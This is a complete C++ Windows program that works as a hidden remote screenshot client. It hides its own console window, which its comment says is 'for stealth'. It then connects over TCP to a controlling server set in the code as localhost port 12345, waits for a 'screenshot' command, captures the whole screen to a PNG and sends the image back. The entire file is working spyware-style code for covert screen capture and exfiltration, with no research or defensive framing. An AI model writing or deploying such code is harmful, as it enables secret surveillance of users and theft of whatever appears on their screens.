#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>

#pragma comment(lib, "ws2_32.lib")      // Link the Winsock library for network communication
#pragma comment(lib, "Gdiplus.lib")     // Link the GDI+ library for image processing

using namespace Gdiplus;

// Converts a UTF-8 std::string to std::wstring (needed for GDI+ file saving)
std::wstring StringAtoW(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

// Captures a screenshot of the entire screen and saves it as a PNG file
void TakeScreenshot(const char* filename) {
    ULONG_PTR gdiplusToken;
    GdiplusStartupInput gdiStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL); // Initialize GDI+

    int width = GetSystemMetrics(SM_CXSCREEN);             // Get screen width
    int height = GetSystemMetrics(SM_CYSCREEN);            // Get screen height

    HDC hScreenDC = GetDC(NULL);                           // Get device context of the screen
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);         // Create a compatible device context
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height); // Create a compatible bitmap
    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap); // Select bitmap into memory DC

    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY); // Copy screen to bitmap
    Bitmap bmp(hBitmap, NULL);                          // Wrap bitmap with GDI+ Bitmap object

    CLSID pngClsid;
    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid); // PNG encoder CLSID
    bmp.Save(StringAtoW(filename).c_str(), &pngClsid, NULL); // Save bitmap to PNG file

    // Clean up GDI objects
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    GdiplusShutdown(gdiplusToken); // Shut down GDI+
}

// Sends a file to the server over the socket connection
bool SendFile(SOCKET sock, const char* filename) {
    std::ifstream file(filename, std::ios::binary); // Open file in binary mode
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return false;
    }

    file.seekg(0, std::ios::end);                  // Go to end to get file size
    size_t filesize = file.tellg();                // Get size
    file.seekg(0, std::ios::beg);                  // Reset to beginning

    send(sock, (char*)&filesize, sizeof(filesize), 0); // Send file size first

    char buffer[1024];
    while (!file.eof()) {
        file.read(buffer, sizeof(buffer));         // Read file chunk
        std::streamsize bytesRead = file.gcount(); // Number of bytes read
        send(sock, buffer, bytesRead, 0);          // Send chunk to server
    }

    file.close();
    return true;
}

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // Hide console window for stealth

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData); // Initialize Winsock

    const char* server_ip = "127.0.0.1";   // Server IP address (localhost)
    const int server_port = 12345;        // Server port

    // Create TCP socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serv_addr = {};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(server_port);       // Convert port to network byte order
    serv_addr.sin_addr.s_addr = inet_addr(server_ip); // Set server IP

    // Attempt to connect to server
    if (connect(sock, (sockaddr*)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to server." << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait to receive command from server
    char cmdBuf[32] = {0};
    int cmdLen = recv(sock, cmdBuf, sizeof(cmdBuf)-1, 0); // Read up to 31 bytes
    if (cmdLen <= 0) {
        std::cerr << "Failed to receive command." << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::string command(cmdBuf, cmdLen); // Convert to std::string
    if (command == "screenshot") {
        const char* filename = "screenshot.png";
        TakeScreenshot(filename);        // Capture screen
        SendFile(sock, filename);        // Send screenshot to server
    }

    // Clean up and close
    closesocket(sock);
    WSACleanup();
    return 0;
}
